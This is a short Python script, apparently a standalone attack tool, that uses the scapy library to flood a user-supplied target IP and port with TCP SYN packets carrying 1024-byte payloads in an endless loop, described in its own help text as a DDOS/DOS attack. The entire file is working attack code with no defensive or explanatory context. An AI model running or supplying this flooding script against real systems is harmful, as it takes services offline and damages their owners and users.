import argparse
from scapy.all import *

parser = argparse.ArgumentParser()
parser.add_argument('-d', '--ddos', type=str, help='do attack DDOS/DOS', required=True)
parser.add_argument('-p', '--port', type=int, help="port on target", required=True)
args = parser.parse_args()

def Main():
    if args.ddos and args.port:
        try:
            target_ddos = args.ddos 
            target_port = args.port
            ip = IP(dst=target_ddos)
            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
            raw = Raw(b"X"*1024)
            p = ip /tcp / raw
            print(f"[+] Send to : {target_ddos}")
            send(p, loop=1, verbose=0)
        except:
            pass
        
if __name__ == "__main__":
    Main()